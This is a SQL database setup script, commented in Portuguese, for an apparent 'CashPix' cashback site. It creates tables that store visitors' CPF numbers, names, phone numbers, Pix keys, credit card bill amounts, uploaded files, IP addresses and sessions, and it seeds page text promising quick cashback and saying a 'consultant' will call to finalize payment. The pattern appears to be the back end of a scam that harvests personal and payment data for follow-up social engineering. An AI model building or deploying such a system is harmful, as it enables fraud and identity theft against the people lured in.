-- ══════════════════════════════════════════
--  CASHPIX — SETUP NEON DATABASE
--  Cole no SQL Editor do Neon e execute
-- ══════════════════════════════════════════

CREATE TABLE IF NOT EXISTS submissions (
  id BIGSERIAL PRIMARY KEY,
  cpf TEXT NOT NULL,
  cpf_formatted TEXT,
  nome TEXT NOT NULL,
  phone TEXT DEFAULT '',
  pix_type TEXT DEFAULT '',
  pix_key TEXT NOT NULL,
  valor_fatura NUMERIC(12,2) NOT NULL,
  cashback NUMERIC(12,2) NOT NULL,
  file_name TEXT DEFAULT '',
  user_agent TEXT DEFAULT '',
  ip TEXT DEFAULT '',
  status TEXT DEFAULT 'pendente',
  notes TEXT DEFAULT '',
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS settings (
  id INT PRIMARY KEY DEFAULT 1,
  data JSONB NOT NULL DEFAULT '{}'::jsonb
);

CREATE TABLE IF NOT EXISTS activity_log (
  id BIGSERIAL PRIMARY KEY,
  action TEXT NOT NULL,
  details TEXT DEFAULT '',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS active_sessions (
  sid TEXT PRIMARY KEY,
  ip TEXT DEFAULT '',
  user_agent TEXT DEFAULT '',
  first_seen TIMESTAMPTZ DEFAULT NOW(),
  last_ping TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS daily_visits (
  id BIGSERIAL PRIMARY KEY,
  ip TEXT NOT NULL,
  user_agent TEXT DEFAULT '',
  visit_date DATE DEFAULT CURRENT_DATE,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  UNIQUE(ip, visit_date)
);

CREATE TABLE IF NOT EXISTS files (
  key TEXT PRIMARY KEY,
  data TEXT NOT NULL,
  mime_type TEXT DEFAULT 'image/png',
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Insere settings padrão
INSERT INTO settings (id, data) VALUES (1, '{
  "site_name": "CashPix",
  "logo_url": "",
  "primary_color": "#CC092F",
  "accent_color": "#CC092F",
  "cashback_percent": "10",
  "prazo_horas": "72",
  "hero_title": "Resgate seu cashback em 5 passos",
  "hero_subtitle": "Rápido, gratuito e direto no seu Pix, em minutos.",
  "btn_resgatar": "Resgatar meu cashback",
  "btn_consultar": "Consultar status",
  "badge_1": "⚡ Pix em minutos",
  "badge_2": "🔒 100% seguro",
  "badge_3": "💰 10% de volta",
  "footer_text": "Campanha promocional sujeita a regulamento.",
  "s1_title": "Você possui um cartão de crédito?",
  "s1_btn_yes": "Sim, tenho",
  "s1_btn_no": "Ainda não tenho",
  "s1_no_msg": "Infelizmente o cashback está disponível apenas para quem possui cartão.",
  "s2_title": "Qual foi o valor da sua última fatura?",
  "s2_subtitle": "Valor estimado em reais",
  "s2_btn": "Calcular meu cashback",
  "s3_title": "Seu cashback está pronto",
  "s3_cashback_label": "Seu cashback disponível é de",
  "s3_cashback_sub": "Resgate agora direto no seu Pix, em minutos!",
  "s3_pix_title": "Onde você quer receber? Escolha o tipo da sua chave Pix",
  "s3_btn": "Confirmar chave Pix",
  "s4_title": "Informe seu telefone para contato",
  "s4_subtitle": "Um consultor entrará em contato para finalizar a liberação do seu cashback.",
  "s4_btn": "Continuar",
  "s5_title": "Valide seus dados com o CPF",
  "s5_subtitle": "Informe seu CPF para confirmarmos sua elegibilidade ao cashback.",
  "s5_btn": "Validar CPF",
  "s5_footer": "Seus dados são tratados de forma segura e usados apenas para validar o resgate.",
  "success_title": "Tudo certo, {nome}!",
  "success_msg": "Seus dados foram validados. Um consultor entrará em contato em breve para finalizar a liberação do seu cashback."
}'::jsonb) ON CONFLICT (id) DO NOTHING;
